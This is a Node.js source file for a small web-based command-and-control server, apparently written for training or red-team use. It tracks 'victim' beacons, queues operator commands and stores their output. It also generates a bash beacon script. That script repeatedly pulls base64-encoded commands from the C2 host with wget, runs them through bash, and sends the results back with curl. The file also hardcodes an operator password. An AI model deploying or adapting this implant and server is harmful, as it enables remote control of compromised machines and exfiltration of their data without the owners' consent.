var sys = require("sys");
var my_http = require("http");
var url = require("url");
var path = require("path");
var fs = require("fs");
var settings = require('./settings');
var port = settings.port;

var authCode = "midnightshift";
var records = [];
var App = {
	ini:function(){
		App.generateBeacon();
		App.generateBeacon(true);
		my_http.createServer(App.server).listen(port);
		console.log("\nWebC2 server started " + settings.getServer());
		console.log("Created by 2Lt Gavin Delphia - 2015\n");
	},
	parseURL:function(url_in){
		var result = url.parse(url_in, true);
		var params = result.query;

		if (params.auth){ //If an auth code is supplied then we need to convert the data otherwise it is a beacon and we are good
			for (var key in params){
				params[key] = new Buffer(params[key], "base64").toString('ascii');
			}			
		}


		params.path = result.pathname;

		return params;
	},
	handleBeacon:function(name, action){
		for (beacon in records){
			if (name == records[beacon].name){
				return beacon; //return index
			}
		}

		if (action == "register"){ //Beacon not found so it must be new
			records.push({name:name, pendingTasks: [], taskResults: []});
			return records.length - 1;
		}

		return -1;
	},
	getbeaconResponses:function(beacon){
		var index = App.handleBeacon(beacon, "lookup");;
		var result = JSON.stringify("Beacon does not exist");

		if (index >= 0){
			result = JSON.stringify(records[index].taskResults);
			records[index].taskResults = [];		
		}

		return result;
	},
	getBeaconList:function(){
		var result = [];
		for (beacon in records){
			result.push(records[beacon].name);
		}
		return result;
	},
	generateBeacon:function(test){
		var data = "";
		var name = (test) ? "testScript" : "beacon";


		data += "#!/bin/bash\n";
		if (test){
			data += "nodejs server.js | tee log &\n";
			data += "sleep 1\n";
		}
		data += "while true; do\n";
		data += "\tp=" + settings.port + "\n";
		data += "\ti=" + settings.ip + "\n";
		data += (test) ? "\tb=b=test_`hostname`\n" : "\tb=b=`hostname`\n";
		data += "\twget -q http://$i:$p/c?$b -O a1\n";
		data += "\tbase64 --decode < a1 > a3\n";
		data += "\ttr -cd '\\11\\12\\40-\\176' < a3 > a2\n";
		data += "\tbash -v < a2 > out 2>&1\n";
		data += "\tbase64 < out > out2\n";
		data += "\ttr -d '\\n' < out2 > out3\n";
		data += "\td=d=`cat out3`\n";
		data +=	"\tcurl -L http://$i:$p/r?$b'&'$d -m 1 2> /dev/null\n";
		data += "\trm a* 2> /dev/null\n";
		data += "\trm out* 2> /dev/null\n";
		data += "\tsleep 15\n";
		data += "done;\n";

		fs.writeFile(name, data);
	},
	server:function(req, res){
		var params = App.parseURL(req.url); //Break out the url parameters into a object

		//Commands below are the whitelist for what can be done with authentication
		//Beacon checkin and response, deliver of settings.js and the web index.html file (/)
		if (params.path != "/settings.js" && params.path != "/r" && params.path != "/c" && params.path != "/"){
			if (params.auth != authCode){
				console.log("Controllerer [" + req.connection.remoteAddress + "] is not authorized to access [" + params.path + "]");
				res.write("Unauthorized");
				res.end();
				return false;
			}
		}


		if (params.path === "/c"){ //Victim checkin and get the next command
			var index = App.handleBeacon(params.b, "register"); //Register

			var task = records[index].pendingTasks.shift() || ""; //Get the next command or nothing

			if (task && task.command){
				records[index].taskResults.push(task);
				var message = new Buffer(task.command).toString('base64'); //Convert command to base63
				res.write(message); //Send it
			} else {
				res.write("");
			}

			console.log("Beacon [" + params.b + "] just checked in from [" + req.connection.remoteAddress + "]" + (task.command ?  "\n\ttask: " + task.command : "")); //Log it
			res.end(); //End it
		}

		if (params.path === "/r"){ //Victim responding to a command
			var index = App.handleBeacon(params.b, "register");
			var response = new Buffer(params.d, "base64").toString('ascii');

			if (response){
				var arr = records[index].taskResults;
				arr[arr.length - 1].response = response;
				arr[arr.length - 1].beacon = params.b;
				console.log("[" + params.b + "] responding from [" + req.connection.remoteAddress + "]" + (response ?  "\n\tresponse: " + response : ""));
			}
		}

		if (params.path === "/downloadBeacon"){ //Controller tasking a victim
			params.path = "/beacon";
			console.log("Controllerer [" + req.connection.remoteAddress + "] requests to download the beacon module");
		}


		if (params.path === "/taskBeacon"){ //Controller tasking a victim
			var index = App.handleBeacon(params.beacon, "lookup");

			if (index < 0){ //If beacon doesn't exists
				res.write("The beacon [" + params.beacon +  "] is not registered");
			} else { //Beacon does exist
				records[index].pendingTasks.push({command: params.command, tid: params.tid});
				res.write("The beacon [" + params.beacon +  "] has been tasked");
				console.log("Controllerer [" + req.connection.remoteAddress + "] requests beacon [" + params.beacon + "] is tasked " + (params.command ?  "\n\ttask: " + params.command : ""));			
			}
			res.end();
		}

		if (params.path === "/clearRecords"){
			records = [];
			res.write("Records Cleared");
			res.end();
			console.log("Controllerer [" + req.connection.remoteAddress + "] requests records to be cleared.\nRecords: ");
			console.log(records)
		}

		if (params.path === "/readBeacon"){
			var data = App.getbeaconResponses(params.beacon);
			res.write(data);
			res.end();
			console.log("Controllerer [" + req.connection.remoteAddress + "] requests data from beacon [" +  params.beacon + "] " +  (data ?  "\n\tdata: " + data : ""));
		}

		if (params.path === "/getBeaconList"){
			var data = JSON.stringify(App.getBeaconList());
			res.write(data);
			res.end();
			console.log("Controllerer [" + req.connection.remoteAddress + "] requests a list of all beacons" + (data ?  "\n\tdata: " + data : ""));		
		}

		if (params.path === "/" || params.path === "/settings.js" || params.path === "/beacon"){ //Be careful what you put here. These are files you are allowing to be accessed on the server remotely
			params.path = (params.path === "/") ? "/index.html" : params.path;

			var full_path = path.join(process.cwd(), params.path);
			fs.exists(full_path, function(exists){
				if (!exists){
					res.writeHeader(404, {"Content-Type": "text/plain"});  
					res.write("404 Not Found\n");  
					res.end();
				} else {
					fs.readFile(full_path, "binary", function(err, file) {  
					     if (err) {  
					         res.writeHeader(500, {"Content-Type": "text/plain"});  
					         res.write(err + "\n");  
					         res.end();  
					     } else if (params.path === "/beacon"){ //These are files that can be downloaded as attachments
							res.writeHeader(200, {"Content-Type": "application/octet-stream", "Content-Disposition": "attachment; filename=beacon"});
					        res.write(file, "binary");
					        res.end();
					        console.log("Controllerer [" + req.connection.remoteAddress + "] downloaded the file [" + params.path + "]");					     	
					     } else {
							res.writeHeader(200);  
					        res.write(file, "binary");
					        res.end();
					        console.log("Controllerer [" + req.connection.remoteAddress + "] was given data in file [" + params.path + "]");
						} 
					});
				}
			});	
		}
	}
};

App.ini();